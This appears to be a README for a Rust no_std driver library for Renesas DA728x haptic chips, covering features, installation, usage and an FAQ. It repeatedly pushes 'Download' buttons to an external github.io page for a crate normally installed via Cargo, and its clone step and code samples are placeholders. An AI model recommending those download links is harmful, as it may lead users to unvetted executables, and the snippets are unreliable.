# da728x - Embedded Haptic Driver Library 2026

> **da728x is an async, `no_std` Rust library for controlling Renesas DA7280, DA7281, and DA7282 haptic driver ICs over I2C in embedded systems.**

[![Platform](https://img.shields.io/badge/Platform-Rust%20no__std-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-development-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/simonm62/da728x-rs-win-54367?style=flat-square)](https://github.com/simonm62/da728x-rs-win-54367)

---

<p align="center">
  <a href="https://simonm62.github.io/da728x-rs-win-54367/">
    <img src="https://img.shields.io/badge/Download-da728x%20Latest-brightgreen?style=for-the-badge" alt="Download da728x">
  </a>
</p>

> **[Direct Download - da728x](https://simonm62.github.io/da728x-rs-win-54367/)**

---

[Download Latest Build](https://simonm62.github.io/da728x-rs-win-54367/)

---

## About da728x

da728x provides a Rust interface for integrating Renesas DA7280, DA7281, and DA7282 haptic driver ICs into embedded products. Its `no_std` design targets resource-constrained systems, while its I2C-based API supports applications built around linear resonant actuators (LRAs).

The library is designed for both asynchronous embedded applications and projects that prefer a blocking interface. It combines device configuration, playback control, resonant-frequency management, diagnostics, and waveform support in one driver-oriented package.

---

## Features

- Async API with an optional blocking API
- Support for Renesas DA7280, DA7281, and DA7282 devices
- I2C communication for embedded hardware integration
- Configuration validation before device operation
- Resonant-frequency control for LRA applications
- Playback enable and disable controls
- System event and diagnostic handling
- LRA frequency-track, wideband, and custom waveform modes
- DRO mode support
- Waveform memory upload and `RTWM_MODE` support
- Programmatic waveform and sequence builders
- Interactive waveform builder web application
- Optional `defmt` debug logging

---

## Installation

Add the crate to an embedded Rust project with Cargo:

```toml
[dependencies]
da728x = "VERSION"
```

Replace `VERSION` with the release or revision selected for your project.

For development, clone the repository and enter its directory:

```bash
git clone https://github.com/simonm62/da728x-rs-win-54367.git
cd REPO
cargo build
```

Enable the features required by your application, such as a blocking API or `defmt` logging, according to the crate configuration. Initialize the driver with an embedded I2C implementation and the appropriate DA728x device configuration before starting playback.

---

## Usage

A typical integration follows this workflow:

1. Create an I2C bus using the embedded platform's HAL.
2. Select the DA7280, DA7281, or DA7282 device variant.
3. Build and validate the driver configuration.
4. Construct the driver with the I2C interface.
5. Configure resonant-frequency or waveform behavior.
6. Upload waveform data when required.
7. Enable playback and monitor system events or diagnostics.
8. Disable playback when the haptic effect is complete.

A project using the blocking interface may follow this general pattern:

```rust
let config = Config::default();
let driver = Da728x::new_blocking(i2c, address, config)?;

driver.enable_playback()?;
driver.disable_playback()?;
```

The exact types, constructors, address handling, and feature flags depend on the selected crate revision and embedded HAL setup. Refer to the generated Rust documentation and examples included with the project for device-specific details.

---

## Configuration

Driver settings are defined in Rust rather than an external configuration file. Use the configuration builder or configuration types provided by the crate to select the device behavior, actuator mode, frequency options, waveform settings, and diagnostic preferences.

A representative configuration flow looks like this:

```rust
let config = Config::builder()
    .validate()?;
```

Waveform data and playback sequences can be created programmatically, or prepared with the interactive waveform builder web application before being transferred to the driver's waveform memory.

Optional logging can be enabled through the crate's `defmt` support when the surrounding embedded application uses `defmt`.

---

## Requirements

- Rust toolchain with embedded target support
- A `no_std`-compatible embedded environment
- An I2C peripheral and compatible embedded HAL implementation
- One of the supported Renesas devices:
  - DA7280
  - DA7281
  - DA7282
- A linear resonant actuator for LRA-based haptic output
- Sufficient device memory and transport capacity for any waveform data used

The library does not require a desktop runtime for embedded use. The waveform builder web application is an optional development aid.

---

## FAQ

### Which devices are supported?

da728x supports the Renesas DA7280, DA7281, and DA7282 haptic driver ICs.

### Does the library require the standard library?

No. The library targets Rust `no_std` embedded systems.

### Is an asynchronous API available?

Yes. The primary API is asynchronous, with an optional blocking API for applications that do not use async execution.

### How are haptic waveforms created?

Waveforms and sequences can be assembled programmatically. The project also provides an interactive waveform builder web application and supports uploading data to waveform memory.

### Can I use LRA frequency tracking?

Yes. The library includes frequency-track, wideband, and custom waveform modes for LRA applications, along with resonant-frequency controls.

### How do I troubleshoot device behavior?

Start by checking the I2C connection, selected device variant, address configuration, actuator wiring, and validated driver settings. Enable optional `defmt` logging when available, then inspect system events and diagnostic information reported by the device.

### How are updates delivered?

Updates are published through the repository and its available builds. Review the project history and release information before updating an embedded application.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
